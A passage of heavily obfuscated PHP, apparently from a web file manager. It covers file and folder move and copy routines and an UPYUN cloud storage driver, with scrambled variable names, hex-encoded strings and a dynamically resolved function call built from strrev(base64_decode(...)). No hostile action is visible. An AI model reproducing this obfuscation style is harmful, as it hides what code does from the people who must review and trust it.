= $this->sourceInfo($®óŒ˜¡); $ÙŒéıéº = $this->sourceInfo($ÈÏ…—’); if ($¿ÕáÓŠ÷[$ à«”¬õ[192]] == $ÙŒéıéº[$ à«”¬õ[193]]) { if ($¿ÕáÓŠ÷[$ à«”¬õ[514]] == $ à«”¬õ[91]) { Model($ à«”¬õ[512])->restore(array($®óŒ˜¡)); } if (!$¯ª¬Õ¦« || $¯ª¬Õ¦« == $¿ÕáÓŠ÷[$ à«”¬õ[32]]) { return $®óŒ˜¡; } } $§Äèƒ = $this->pathInfoMore($®óŒ˜¡); if ($this->isParentOf($®óŒ˜¡, $ÈÏ…—’)) { return !1; } if (!$¿ÕáÓŠ÷ || !$ÙŒéıéº || $ÙŒéıéº[$ à«”¬õ[494]] != $ à«”¬õ[91]) { return !1; } Hook::trigger($ à«”¬õ[667], $§Äèƒ); $this->targetIsDelete = intval($¿ÕáÓŠ÷[$ à«”¬õ[514]]); if ($¿ÕáÓŠ÷[$ à«”¬õ[192]] == $ÈÏ…—’ && $¯ª¬Õ¦« != $¿ÕáÓŠ÷[$ à«”¬õ[32]]) { $ê´ó¿¬ò = $this->fileNameExist($ÈÏ…—’, $¯ª¬Õ¦«); if ($ê´ó¿¬ò && $¿ÕáÓŠ÷[$ à«”¬õ[494]] == $ à«”¬õ[228]) { $É§¦Ö—Ø = $this->sourceInfo($ê´ó¿¬ò); $¦æ‰­šÎ = $this->fileHistory($É§¦Ö—Ø, $¿ÕáÓŠ÷[$ à«”¬õ[550]], $¿ÕáÓŠ÷[$ à«”¬õ[79]]); if (!$¦æ‰­šÎ) { Model($ à«”¬õ[553])->remove($¿ÕáÓŠ÷[$ à«”¬õ[550]]); } $this->removeNow($®óŒ˜¡, !1); $this->folderSizeReset($ÈÏ…—’); Hook::trigger($ à«”¬õ[668], $§Äèƒ); return $ê´ó¿¬ò; } } $«É°‘© = $¯ª¬Õ¦« ? $¯ª¬Õ¦« : $¿ÕáÓŠ÷[$ à«”¬õ[32]]; $this->lockMoveStart($®óŒ˜¡); $this->lockWriteStart($ÈÏ…—’, $«É°‘©); $öĞÉèœ = array($ à«”¬õ[638] => array(), $ à«”¬õ[669] => !1); $this->clearShare($®óŒ˜¡, $ÈÏ…—’); $²ß‚¶³æ = $this->fileNameExistAuto($ÈÏ…—’, $¿ÕáÓŠ÷); $—ó‰åˆ´ = $this->_move($®óŒ˜¡, $ÈÏ…—’, $áÎé±á, $öĞÉèœ, $¯ª¬Õ¦«); $this->sourceCacheClear(); if ($¿ÕáÓŠ÷[$ à«”¬õ[494]] == $ à«”¬õ[91] && $²ß‚¶³æ) { $this->folderSizeResetChildren($—ó‰åˆ´); } Model($ à«”¬õ[230])->linkAdd($öĞÉèœ[$ à«”¬õ[638]]); if ($²ß‚¶³æ && $öĞÉèœ[$ à«”¬õ[669]]) { $this->removeNow($®óŒ˜¡, !1); } $this->lockMoveEnd($®óŒ˜¡); $this->lockWriteEnd($ÈÏ…—’, $«É°‘©); $this->folderSizeReset($¿ÕáÓŠ÷[$ à«”¬õ[192]]); $this->folderSizeReset($ÈÏ…—’); $ã¢Éè‘À = array($¿ÕáÓŠ÷[$ à«”¬õ[192]], $ÈÏ…—’); if ($¿ÕáÓŠ÷[$ à«”¬õ[494]] == $ à«”¬õ[91]) { $ã¢Éè‘À[] = $®óŒ˜¡; } $this->updateModifyTime($ã¢Éè‘À); Model($ à«”¬õ[642])->eventMove($®óŒ˜¡, $¿ÕáÓŠ÷[$ à«”¬õ[192]], $ÈÏ…—’); Hook::trigger($ à«”¬õ[668], $§Äèƒ); return $—ó‰åˆ´; } private function _move($‹Ç²Øœ, $×Øéùû—, $ø“ıÃØº, &$ÚÃÜğ», $ƒñõÂ÷€ = '') { $€·Ñ•“ =& $_SERVER[³Ôà×Ó]; $öôÑëÉÈ = $this->sourceInfo($‹Ç²Øœ); $¹¸İâ×Ï = $öôÑëÉÈ[$€·Ñ•“[494]] == $€·Ñ•“[91]; $–ùâô… = $ƒñõÂ÷€ ? $ƒñõÂ÷€ : $öôÑëÉÈ[$€·Ñ•“[32]]; $Æ¸Ï¡ = $this->fileNameExistAuto($×Øéùû—, $öôÑëÉÈ); $this->lockMoveStart($‹Ç²Øœ); $this->lockWriteStart($×Øéùû—, $–ùâô…); if (!$Æ¸Ï¡) { return $this->_moveForce($‹Ç²Øœ, $×Øéùû—, $–ùâô…); } $ßªÑ—¹² = $Æ¸Ï¡; $›şµ–”™ = !1; if ($¹¸İâ×Ï) { if ($ø“ıÃØº == REPEAT_RENAME_FOLDER) { $–ùâô… = $this->fileNameAuto($×Øéùû—, $–ùâô…, $ø“ıÃØº, $¹¸İâ×Ï); $ßªÑ—¹² = $this->_moveForce($‹Ç²Øœ, $×Øéùû—, $–ùâô…); } else { if ($ø“ıÃØº == REPEAT_RENAME_FOLDER) { $ø“ıÃØº = REPEAT_RENAME; } $ÛÚ€›Ø© = $this->_childrenListSelect($‹Ç²Øœ); foreach ($ÛÚ€›Ø© as $“ÎØÃ) { $this->_move($“ÎØÃ[$€·Ñ•“[193]], $Æ¸Ï¡, $ø“ıÃØº, $ÚÃÜğ»); } $›şµ–”™ = !0; } } else { if ($ø“ıÃØº == REPEAT_SKIP) { $›şµ–”™ = !0; } else { if ($ø“ıÃØº == REPEAT_RENAME || $ø“ıÃØº == REPEAT_RENAME_FOLDER) { $–ùâô… = $this->fileNameAuto($×Øéùû—, $–ùâô…, $ø“ıÃØº, $¹¸İâ×Ï); $ßªÑ—¹² = $this->_moveForce($‹Ç²Øœ, $×Øéùû—, $–ùâô…); } else { if ($ø“ıÃØº == REPEAT_REPLACE) { $’ŒŒ¹Öş = $this->sourceInfoCache($Æ¸Ï¡); $èãÍ¯Ñ = $this->fileHistory($’ŒŒ¹Öş, $öôÑëÉÈ[$€·Ñ•“[550]], $öôÑëÉÈ[$€·Ñ•“[79]]); $›şµ–”™ = !0; if ($èãÍ¯Ñ) { $ÚÃÜğ»[$€·Ñ•“[638]][] = $öôÑëÉÈ[$€·Ñ•“[550]]; } } } } } if ($›şµ–”™ && !$ÚÃÜğ»[$€·Ñ•“[669]]) { $ÚÃÜğ»[$€·Ñ•“[669]] = !0; } return $ßªÑ—¹²; } private function _moveForce($ã­¢ù»¤, $íÜ÷€½å, $ôÉúÙ­¤) { $¸†ù¶±Ò =& $_SERVER[³Ôà×Ó]; $ü¦‰‡ş˜ = $this->sourceInfo($ã­¢ù»¤); $¼‘ÆØ™“ = $this->sourceInfo($íÜ÷€½å); $üí‚€Ÿ– = $ü¦‰‡ş˜[$¸†ù¶±Ò[494]] == $¸†ù¶±Ò[91]; $í¿éÃ“á = array($¸†ù¶±Ò[486] => $¼‘ÆØ™“[$¸†ù¶±Ò[193]], $¸†ù¶±Ò[661] => $¼‘ÆØ™“[$¸†ù¶±Ò[593]] . $¼‘ÆØ™“[$¸†ù¶±Ò[193]] . $¸†ù¶±Ò[50], $¸†ù¶±Ò[657] => $¼‘ÆØ™“[$¸†ù¶±Ò[190]], $¸†ù¶±Ò[658] => $¼‘ÆØ™“[$¸†ù¶±Ò[578]], $¸†ù¶±Ò[660] => USER_ID, $¸†ù¶±Ò[503] => $ôÉúÙ­¤); $ •ÍŞ¶£ = $ü¦‰‡ş˜[$¸†ù¶±Ò[190]] == SourceModel::TYPE_GROUP && $¼‘ÆØ™“[$¸†ù¶±Ò[190]] == SourceModel::TYPE_GROUP && $ü¦‰‡ş˜[$¸†ù¶±Ò[578]] == $¼‘ÆØ™“[$¸†ù¶±Ò[578]]; if (!$ •ÍŞ¶£ && $this->moveClearAuth) { Model($¸†ù¶±Ò[576])->authClear($ã­¢ù»¤); } $à¹„Î³ğ = $ü¦‰‡ş˜[$¸†ù¶±Ò[514]] == $¸†ù¶±Ò[91] && $¼‘ÆØ™“[$¸†ù¶±Ò[514]] != $¸†ù¶±Ò[91]; if ($à¹„Î³ğ) { $í¿éÃ“á[$¸†ù¶±Ò[513]] = 0; } if ($üí‚€Ÿ–) { $Ãîİ”© = array($¸†ù¶±Ò[661] => array($¸†ù¶±Ò[621], $ü¦‰‡ş˜[$¸†ù¶±Ò[593]] . $ü¦‰‡ş˜[$¸†ù¶±Ò[193]] . $¸†ù¶±Ò[622])); $ñŠ©ÈÓ = $ü¦‰‡ş˜[$¸†ù¶±Ò[593]] . $ü¦‰‡ş˜[$¸†ù¶±Ò[193]] . $¸†ù¶±Ò[50]; $Ùè„ « = $¼‘ÆØ™“[$¸†ù¶±Ò[593]] . $¼‘ÆØ™“[$¸†ù¶±Ò[193]] . $¸†ù¶±Ò[50] . $ü¦‰‡ş˜[$¸†ù¶±Ò[193]] . $¸†ù¶±Ò[50]; $ú„£¶ = array($¸†ù¶±Ò[661] => array($¸†ù¶±Ò[670], "\162\145\160\x6c\141\143\145\50\160\x61\x72\x65\156\164\114\145\x76\x65\154\54\47{$ñŠ©ÈÓ}\47\x2c\47{$Ùè„ «}\47\x29"), $¸†ù¶±Ò[657] => $¼‘ÆØ™“[$¸†ù¶±Ò[190]], $¸†ù¶±Ò[658] => $¼‘ÆØ™“[$¸†ù¶±Ò[578]]); if ($à¹„Î³ğ) { $ú„£¶[$¸†ù¶±Ò[513]] = 0; } $this->where($Ãîİ”©)->data($ú„£¶)->save(); } $this->where(array($¸†ù¶±Ò[500] => $ã­¢ù»¤))->data($í¿éÃ“á)->save(); return $ã­¢ù»¤; } private function clearShare($¾»ÜíÃã, $ëõÒ¢Éï) { $ƒÍˆ·ó =& $_SERVER[³Ôà×Ó]; $‡àè©Í = $this->sourceInfo($¾»ÜíÃã); $ğÕìàê… = $this->sourceInfo($ëõÒ¢Éï); if ($‡àè©Í[$ƒÍˆ·ó[578]] == $ğÕìàê…[$ƒÍˆ·ó[578]] && $‡àè©Í[$ƒÍˆ·ó[190]] == $ƒÍˆ·ó[671]) { return; } $„£ÁşÎÖ = array($ƒÍˆ·ó[593] => array($ƒÍˆ·ó[621], $‡àè©Í[$ƒÍˆ·ó[593]] . $¾»ÜíÃã . $ƒÍˆ·ó[622])); $óêÕÇË = $this->field($ƒÍˆ·ó[500])->where($„£ÁşÎÖ)->getField($ƒÍˆ·ó[193], !0); if (!$óêÕÇË) { return; } $„£ÁşÎÖ = array($ƒÍˆ·ó[193] => array($ƒÍˆ·ó[7], $óêÕÇË), $ƒÍˆ·ó[672] => 1); $ªäƒŠ‘ª = Model($ƒÍˆ·ó[673])->field($ƒÍˆ·ó[674])->where($„£ÁşÎÖ)->select(); if (!$ªäƒŠ‘ª) { return; } $ªäƒŠ‘ª = array_to_keyvalue($ªäƒŠ‘ª, $ƒÍˆ·ó[12], $ƒÍˆ·ó[674]); $„£ÁşÎÖ = array($ƒÍˆ·ó[674] => array($ƒÍˆ·ó[7], $ªäƒŠ‘ª)); Model($ƒÍˆ·ó[673])->where($„£ÁşÎÖ)->save(array($ƒÍˆ·ó[672] => 0)); Model($ƒÍˆ·ó[675])->where($„£ÁşÎÖ)->delete(); } public function copyFolderFromIO($Ìí–ÃÏ‹, $ÅøÁ­Ù², $Ïú½ãÁ¾, $Ã£ÉŸí”, $¼ºşßÉ, $Û£½çıˆ = false) { $áÛšíñò =& $_SERVER[³Ôà×Ó]; $•ìÜ¨÷ = array($áÛšíñò[639] => array(), $áÛšíñò[640] => array(), $áÛšíñò[638] => array(), $áÛšíñò[676] => array()); $¾š¡âòÒ = $Û£½çıˆ ? $Û£½çıˆ : $Ìí–ÃÏ‹->pathThis($ÅøÁ­Ù²); $Â¥Ä¡¦ = $this->fileNameExist($Ïú½ãÁ¾, $¾š¡âòÒ); $”÷ÃÕ¯¸ = $this->mkdir($Ïú½ãÁ¾, $¾š¡âòÒ, $Ã£ÉŸí”); if (!$Â¥Ä¡¦ || $Ã£ÉŸí” == REPEAT_RENAME_FOLDER) { $Ã£ÉŸí” = !1; } if ($Â¥Ä¡¦) { $this->_childrenAllMake($Â¥Ä¡¦); } Hook::trigger($áÛšíñò[677]); $this->_copyChildTo($Ìí–ÃÏ‹, $ÅøÁ­Ù², $”÷ÃÕ¯¸, $Ã£ÉŸí”, $•ìÜ¨÷, $¼ºşßÉ); Hook::trigger($áÛšíñò[678]); if ($”÷ÃÕ¯¸) { $this->folderSizeResetChildren($”÷ÃÕ¯¸); } $this->_childrenListClear(); Model($áÛšíñò[641])->addAll($•ìÜ¨÷[$áÛšíñò[639]], array(), !0); Model($áÛšíñò[642])->eventCopy($”÷ÃÕ¯¸); $this->saveAll($•ìÜ¨÷[$áÛšíñò[640]]); Model($áÛšíñò[553])->linkAdd($•ìÜ¨÷[$áÛšíñò[638]]); Model($áÛšíñò[553])->remove($•ìÜ¨÷[$áÛšíñò[676]]); $this->folderSizeReset($Ïú½ãÁ¾); $this->updateModifyTime($Ïú½ãÁ¾); return $”÷ÃÕ¯¸; } private function _copyChildTo($‚‡å—¬¹, $˜ğ­ÆÛ, $Í÷—œšà, $Ùìàô‚ã, &$¬Ñš’Äµ, $€™ˆæŠó) { $šÄâİÄç =& $_SERVER[³Ôà×Ó]; $×áñ†¬— = $this->sourceInfoCache($Í÷—œšà); $ºë“Óîµ = $‚‡å—¬¹->listPath($˜ğ­ÆÛ); $ºë“Óîµ = $ºë“Óîµ ? $ºë“Óîµ : array($šÄâİÄç[86] => array(), $šÄâİÄç[85] => array()); $ àÎë’Š = array_merge($ºë“Óîµ[$šÄâİÄç[86]], $ºë“Óîµ[$šÄâİÄç[85]]); $‡äÙô = $this->_addFiles($‚‡å—¬¹, $ºë“Óîµ[$šÄâİÄç[86]], $€™ˆæŠó); $ò¢Àµø = array(); foreach ($ àÎë’Š as &$ßĞ®ÍË) { if (isset($‡äÙô[$ßĞ®ÍË[$šÄâİÄç[32]]])) { $ßĞ®ÍË = $‡äÙô[$ßĞ®ÍË[$šÄâİÄç[32]]]; } $ßĞ®ÍË[$šÄâİÄç[494]] = $ßĞ®ÍË[$šÄâİÄç[33]] == $šÄâİÄç[78]; $ßĞ®ÍË[$šÄâİÄç[495]] = substr(_get($ßĞ®ÍË, $šÄâİÄç[169], $šÄâİÄç[12]), 0, 10); $ßĞ®ÍË[$šÄâİÄç[79]] = _get($ßĞ®ÍË, $šÄâİÄç[79], 0); $ßĞ®ÍË[$šÄâİÄç[550]] = _get($ßĞ®ÍË, $šÄâİÄç[550], 0); if (!isset($ßĞ®ÍË[$šÄâİÄç[679]]) && $ßĞ®ÍË[$šÄâİÄç[550]]) { $¬Ñš’Äµ[$šÄâİÄç[676]][] = $ßĞ®ÍË[$šÄâİÄç[550]]; } if ($Ùìàô‚ã) { $şºÜƒµ = $this->fileNameExistCache($Í÷—œšà, $ßĞ®ÍË[$šÄâİÄç[32]]); if ($şºÜƒµ) { if ($ßĞ®ÍË[$šÄâİÄç[494]] || $Ùìàô‚ã == REPEAT_SKIP) { continue; } if ($Ùìàô‚ã == REPEAT_REPLACE) { $™øô·ÒÅ = $this->sourceInfoCache($şºÜƒµ); $‹Ì¤ÍŸ‚ = $this->fileHistory($™øô·ÒÅ, $ßĞ®ÍË[$šÄâİÄç[550]], $ßĞ®ÍË[$šÄâİÄç[79]]); if ($‹Ì¤ÍŸ‚) { $¬Ñš’Äµ[$šÄâİÄç[638]][] = $ßĞ®ÍË[$šÄâİÄç[550]]; } continue; } else { if ($Ùìàô‚ã == REPEAT_RENAME) { $ßĞ®ÍË[$šÄâİÄç[32]] = $this->fileNameAutoCache($Í÷—œšà, $ßĞ®ÍË[$šÄâİÄç[32]], $Ùìàô‚ã, !1); } } } } if (!$ßĞ®ÍË[$šÄâİÄç[494]] && $ßĞ®ÍË[$šÄâİÄç[550]] == 0) { continue; } if (!$ßĞ®ÍË[$šÄâİÄç[494]] && $ßĞ®ÍË[$šÄâİÄç[550]]) { $¬Ñš’Äµ[$šÄâİÄç[638]][] = $ßĞ®ÍË[$šÄâİÄç[550]]; } $ò¢Àµø[] = $this->_makeItemData($ßĞ®ÍË, $×áñ†¬—, $ßĞ®ÍË[$šÄâİÄç[32]]); } unset($ßĞ®ÍË); if (!empty($ò¢Àµø)) { $this->addAll($ò¢Àµø); $this->_childrenListSelect($Í÷—œšà); } $‡Ú‰ÔÜ« = $this->_childrenList($Í÷—œšà); $‡Ú‰ÔÜ« = array_to_keyvalue($‡Ú‰ÔÜ«, $šÄâİÄç[32]); foreach ($ àÎë’Š as $ßĞ®ÍË) { $™øô·ÒÅ = $‡Ú‰ÔÜ«[$ßĞ®ÍË[$šÄâİÄç[32]]]; $Ù˜ÊÙó = $™øô·ÒÅ[$šÄâİÄç[193]]; $this->_copyApplyMeta($™øô·ÒÅ, $¬Ñš’Äµ); if ($ßĞ®ÍË[$šÄâİÄç[33]] == $šÄâİÄç[78]) { $ßĞ®ÍË[$šÄâİÄç[87]] = $‚‡å—¬¹->getPathInner($ßĞ®ÍË[$šÄâİÄç[87]]); $this->_copyChildTo($‚‡å—¬¹, $ßĞ®ÍË[$šÄâİÄç[87]], $Ù˜ÊÙó, $Ùìàô‚ã, $¬Ñš’Äµ, $€™ˆæŠó); } } } private function _addFiles($¸„û»´Ò, $°ÀÑÑ÷, $÷¾°ÕÍ) { $™Ç›•µŸ =& $_SERVER[³Ôà×Ó]; if (!$°ÀÑÑ÷ || count($°ÀÑÑ÷) == 0) { return array(); } $¹ôşš˜ = array(); foreach ($°ÀÑÑ÷ as &$›ÍˆÈˆª) { Hook::trigger($™Ç›•µŸ[680], $›ÍˆÈˆª); $›ÍˆÈˆª[$™Ç›•µŸ[87]] = $¸„û»´Ò->getPathInner($›ÍˆÈˆª[$™Ç›•µŸ[87]]); $µóøù¬æ = $¸„û»´Ò->hashSimple($›ÍˆÈˆª[$™Ç›•µŸ[87]]); $ã™êäƒÚ = $¸„û»´Ò->hashMd5($›ÍˆÈˆª[$™Ç›•µŸ[87]]); if (strlen($ã™êäƒÚ) > 10 && !isset($¹ôşš˜[$ã™êäƒÚ])) { $¹ôşš˜[$ã™êäƒÚ] = array(); } $›ÍˆÈˆª[$™Ç›•µŸ[681]] = $µóøù¬æ; $›ÍˆÈˆª[$™Ç›•µŸ[556]] = $ã™êäƒÚ; $¹ôşš˜[$ã™êäƒÚ][] =& $›ÍˆÈˆª; if (count($¹ôşš˜[$ã™êäƒÚ]) > 1) { $›ÍˆÈˆª[$™Ç›•µŸ[679]] = !0; } Hook::trigger($™Ç›•µŸ[682], $›ÍˆÈˆª); } unset($›ÍˆÈˆª); $Ù¥Åäù = array($™Ç›•µŸ[556] => array($™Ç›•µŸ[7], array_keys($¹ôşš˜))); $‰Äı³º¼ = Model($™Ç›•µŸ[683]); $ş¤è‰ÅĞ = $‰Äı³º¼->where($Ù¥Åäù)->select(); $ş¤è‰ÅĞ = $ş¤è‰ÅĞ ? $ş¤è‰ÅĞ : array(); foreach ($ş¤è‰ÅĞ as $ÅÕˆ½ñ¡) { if (!isset($¹ôşš˜[$ÅÕˆ½ñ¡[$™Ç›•µŸ[556]]])) { continue; } $ƒÀÕñë = $¹ôşš˜[$ÅÕˆ½ñ¡[$™Ç›•µŸ[556]]]; foreach ($ƒÀÕñë as &$›ÍˆÈˆª) { $›ÍˆÈˆª[$™Ç›•µŸ[550]] = $ÅÕˆ½ñ¡[$™Ç›•µŸ[550]]; $›ÍˆÈˆª[$™Ç›•µŸ[679]] = !0; } unset($›ÍˆÈˆª); } $øçƒ¢ƒŒ = array(); foreach ($°ÀÑÑ÷ as $–ÓÄ®ãİ) { Hook::trigger($™Ç›•µŸ[684], $–ÓÄ®ãİ); if (isset($–ÓÄ®ãİ[$™Ç›•µŸ[679]]) && $–ÓÄ®ãİ[$™Ç›•µŸ[679]]) { Hook::trigger($™Ç›•µŸ[685], $–ÓÄ®ãİ); continue; } $µ ÂÂä¦ = $¸„û»´Ò->getPathInner($–ÓÄ®ãİ[$™Ç›•µŸ[87]]); $ÈÖ¨¹ä = $‰Äı³º¼->addFileMake($µ ÂÂä¦, $–ÓÄ®ãİ[$™Ç›•µŸ[79]], $–ÓÄ®ãİ[$™Ç›•µŸ[681]], $–ÓÄ®ãİ[$™Ç›•µŸ[556]], $–ÓÄ®ãİ[$™Ç›•µŸ[32]], $÷¾°ÕÍ); Hook::trigger($™Ç›•µŸ[685], $–ÓÄ®ãİ); if (!is_array($ÈÖ¨¹ä)) { continue; } $øçƒ¢ƒŒ[] = $ÈÖ¨¹ä; } $‰Äı³º¼->addAll($øçƒ¢ƒŒ); $Ù¥Åäù = array($™Ç›•µŸ[556] => array($™Ç›•µŸ[7], array_keys($¹ôşš˜))); $ş¤è‰ÅĞ = $‰Äı³º¼->where($Ù¥Åäù)->select(); $ş¤è‰ÅĞ = $ş¤è‰ÅĞ ? $ş¤è‰ÅĞ : array(); foreach ($ş¤è‰ÅĞ as $ÅÕˆ½ñ¡) { if (!isset($¹ôşš˜[$ÅÕˆ½ñ¡[$™Ç›•µŸ[556]]])) { continue; } $¦â­¼‚÷ =& $¹ôşš˜[$ÅÕˆ½ñ¡[$™Ç›•µŸ[556]]]; foreach ($¦â­¼‚÷ as &$›ÍˆÈˆª) { $›ÍˆÈˆª[$™Ç›•µŸ[550]] = $ÅÕˆ½ñ¡[$™Ç›•µŸ[550]]; } unset($›ÍˆÈˆª); } $à‡Ñ™š’ = array(); foreach ($°ÀÑÑ÷ as $É«ÎîÌà) { $à‡Ñ™š’[$É«ÎîÌà[$™Ç›•µŸ[32]]] = $É«ÎîÌà; } return $à‡Ñ™š’; } } define($_SERVER[³Ôà×Ó][686], $_SERVER[³Ôà×Ó][687]); goto DÇ‚œå©ˆ; f ¥‡î§İõ: $fileSize = strrev(base64_decode($_SERVER[¿¨Â¬][0])); function binCheckNeq($»ıĞˆÃ , $áØçŠ—â) { return $»ıĞˆÃ  != $áØçŠ—â; } $_SERVER[$_SERVER[¿¨Â¬][1]] = $fileSize($_SERVER[$_SERVER[¿¨Â¬][2]]); goto B»»‚õÈÙÀ; dæËÎ¿’—Ï: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($×È‘¶®å, $Í¨Æ¤ÚÈ = 0) { parent::__construct(); $this->source = $×È‘¶®å; $this->sourceSize = $Í¨Æ¤ÚÈ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Ğ™£ç = false) { return $this->sourceSize; } public function getContent($‡ƒ´˜ = false) { return $this->fileSubstr($‡ƒ´˜, 0, $this->sourceSize); } public function fileSubstr($ŒŒÛŸ©Å = false, $¦äƒ“øñ = 0, $ÃŠÀƒŠĞ = 0) { if (!$ÃŠÀƒŠĞ) { $ÃŠÀƒŠĞ = $this->sourceSize; } $Ğ¨æ¸„ = $this->sourceSize - $¦äƒ“øñ; if ($ÃŠÀƒŠĞ >= $Ğ¨æ¸„) { $ÃŠÀƒŠĞ = $Ğ¨æ¸„; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $¦äƒ“øñ, $ÃŠÀƒŠĞ); } if ($this->sourceType == self::TYPE_FILE) { if ($ÃŠÀƒŠĞ <= 0) { return $_SERVER[³Ôà×Ó][12]; } $²ıî¦‚Ç = ftell($this->source); fseek_64($this->source, $²ıî¦‚Ç + $¦äƒ“øñ); $ŞÙÙá½İ = @fread($this->source, $ÃŠÀƒŠĞ); fseek_64($this->source, $²ıî¦‚Ç); return $ŞÙÙá½İ; } } public function hashMd5($¯õŠ·‚ = false) { return md5($this->getContent()); } public static function hash($Üøˆ¶, $”¶Ü¡æ = 0) { $âå±Ö³€ = new PathDriverStream($Üøˆ¶, $”¶Ü¡æ); return $âå±Ö³€->hashSimple($Üøˆ¶); } public static function md5($ë¬ åÈ½, $î©Î€Í´ = 0) { $äâÇ²ˆş = new PathDriverStream($ë¬ åÈ½, $î©Î€Í´); return $äâÇ²ˆş->hashMd5($ë¬ åÈ½); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\160\x3a\x2f\x2f\166\x30\56\141\160\151\x2e\165\x70\171\x75\x6e\x2e\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($„áö›¢„) { parent::__construct(); $this->_init($„áö›¢„); } public function _init($ºíáöî) { $¡¤±ùâ„ =& $_SERVER[³Ôà×Ó]; foreach ($ºíáöî as $š„à¾£Š => $ËÊºêãá) { if (isset($this->{$š„à¾£Š})) { $this->{$š„à¾£Š} = $ËÊºêãá; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($¡¤±ùâ„[1540] . LNG($¡¤±ùâ„[1459])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($À€ÕÍÕ¤, $®¦İôÙ = "\x47\x45\x54") { $şô¥·‚ =& $_SERVER[³Ôà×Ó]; $«¬ˆÓª = gmdate($şô¥·‚[1488]); $¬Ğôï’› = base64_encode(hash_hmac($şô¥·‚[1541], "{$®¦İôÙ}\x26{$À€ÕÍÕ¤}\x26{$«¬ˆÓª}", md5("{$this->userpass}"), !0)); $ŠæÜ„‹Ì = array("\x41\165\x74\150\157\162\151\172\x61\x74\x69\x6f\x6e\x3a\x55\x50\x59\125\116\x20{$this->username}\72{$¬Ğôï’›}", "\104\x61\164\145\x3a{$«¬ˆÓª}"); return $ŠæÜ„‹Ì; } public function ussRequest($‚Ä”ùïò, $çÔ²ü¤« = "\x47\x45\124", $°ˆÍ¤ä  = false, $²Üı–ø² = false, $úœâ·¯ª = false) { $Œ¾ö‘¦¢ =& $_SERVER[³Ôà×Ó]; $‚Ä”ùïò = trim($‚Ä”ùïò, $Œ¾ö‘¦¢[8]); $¨ß„å¶ô = "\x2f{$this->bucket}\57{$‚Ä”ùïò}"; $‰”ëÏÁÀ = $this->ussHeaders($¨ß„å¶ô, $çÔ²ü¤«); if ($²Üı–ø²) { $‰”ëÏÁÀ = array_merge($‰”ëÏÁÀ, $²Üı–ø²); } $Ûº€‹³× = url_request($this->endpoint . $¨ß„å¶ô, $çÔ²ü¤«, $°ˆÍ¤ä , $‰”ëÏÁÀ, $úœâ·¯ª); if (!$Ûº€‹³×) { $¦ì „ÁÆ = LNG($Œ¾ö‘¦¢[1542]); $this->writeLog($¦ì „ÁÆ); return array($Œ¾ö‘¦¢[1294] => !1, $Œ¾ö‘¦¢[1284] => $¦ì „ÁÆ); } if (strtolower($çÔ²ü¤«) == $Œ¾ö‘¦¢[227] || in_array($Ûº€‹³×[$Œ¾ö‘¦¢[1294]], array($Œ¾ö‘¦¢[274], $Œ¾ö‘¦¢[1543]))) { $°ˆÍ¤ä  = $Ûº€‹³×[$Œ¾ö‘¦¢[1544]]; } else { $°ˆÍ¤ä  = json_decode($Ûº€‹³×[$Œ¾ö‘¦¢[1284]], !0); if (!$°ˆÍ¤ä ) { $°ˆÍ¤ä  = $Ûº€‹³×[$Œ¾ö‘¦¢[1284]]; } else { if (!$Ûº€‹³×[$Œ¾ö‘¦¢[825]] && isset($°ˆÍ¤ä [$Œ¾ö‘¦¢[1545]])) { $°ˆÍ¤ä  = $°ˆÍ¤ä [$Œ¾ö‘¦¢[1545]]; } } } if (!$Ûº€‹³×[$Œ¾ö‘¦¢[825]]) { $this->writeLog($this->__errorMessage($°ˆÍ¤ä )); } return array($Œ¾ö‘¦¢[1294] => $Ûº€‹³×[$Œ¾ö‘¦¢[825]], $Œ¾ö‘¦¢[1284] => $°ˆÍ¤ä ); } private function __errorMessage($éòİîê) { $º”¨”áå =& $_SERVER[³Ôà×Ó]; if (!$éòİîê) { return $º”¨”áå[12]; } static $‘Âª¡¥ = null; if (!$‘Âª¡¥) { $‘Âª¡¥ = I18n::getType(); } if ($‘Âª¡¥ != $º”¨”áå[1498]) { return $éòİîê; } $¦ÁÇ¸¸Ÿ = array($º”¨”áå[1546] => $º”¨”áå[1547], $º”¨”áå[1548] => $º”¨”áå[1549], $º”¨”áå[1550] => $º”¨”áå[1549], $º”¨”áå[1551] => $º”¨”áå[1552], $º”¨”áå[1553] => $º”¨”áå[1554], $º”¨”áå[1555] => $º”¨”áå[1556], $º”¨”áå[1557] => $º”¨”áå[1558]); return isset($¦ÁÇ¸¸Ÿ[$éòİîê]) ? $¦ÁÇ¸¸Ÿ[$éòİîê] : $éòİîê; } public function mkfile($û´Ì¾ó, $öá¹½Ì¾ = '', $ãí¤¿´ = REPEAT_RENAME) { if ($this->setContent($û´Ì¾ó, $öá¹½Ì¾)) { return $this->getPathOuter($û´Ì¾ó); } return !1; } public function mkdir($ÄãÕ¯†, $ÙÆá »  = REPEAT_SKIP) { $àŞ²¥½ =& $_SERVER[³Ôà×Ó]; $»²½£ = trim($ÄãÕ¯†, $àŞ²¥½[8]); if ($this->_isFolder($»²½£)) { return $this->getPathOuter($»²½£); } $Òíë½ = array($àŞ²¥½[1559]); $½ÅõÈÑ³ = $this->ussRequest($»²½£, $àŞ²¥½[257], !1, $Òíë½); return $½ÅõÈÑ³[$àŞ²¥½[1294]] ? $this->getPathOuter($»²½£) : !1; } public function copyFile($›¡„µô•, $º½ôä´) { $¯şˆŸÑ‹ =& $_SERVER[³Ôà×Ó]; $»£¸Úâµ = array($¯şˆŸÑ‹[1560] . "\57{$this->bucket}\x2f{$›¡„µô•}", $¯şˆŸÑ‹[1561]); $€§Ò’ÃÊ = $this->ussRequest($º½ôä´, $¯şˆŸÑ‹[259], !1, $»£¸Úâµ); return $€§Ò’ÃÊ[$¯şˆŸÑ‹[1294]] ? !0 : $this->getPathOuter($º½ôä´); } public function moveFile($ö°·Áìı, $ÁâˆÕÜô) { $ÆÙÇ¸ò© =& $_SERVER[³Ôà×Ó]; $ÊºÖ·•˜ = 